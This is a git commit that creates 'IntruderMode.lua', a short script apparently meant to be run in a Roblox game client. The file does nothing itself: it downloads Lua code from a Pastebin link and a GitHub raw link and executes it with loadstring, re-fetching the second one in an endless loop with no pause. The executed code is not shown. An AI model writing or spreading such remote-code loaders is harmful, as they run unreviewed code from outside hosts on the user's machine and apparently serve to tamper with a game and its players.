a3874e97f737c515d2ffefb4b3c46bd68b7f1fe7
andrewcodelua <112720895+andrewcodelua@users.noreply.github.com>
2023-04-06 20:00:51 -0300

    Create IntruderMode.lua

---
+++ IntruderMode.lua
@@ -0,0 +1,5 @@
+    loadstring(game:HttpGet("https://pastebin.com/raw/8SmKpVGF"))()
+wait(120)
+while true do
+      loadstring(game:HttpGet("https://raw.githubusercontent.com/andrewcodelua/Random-Things-That-I-Do/main/Intruder.lua"))()
+end
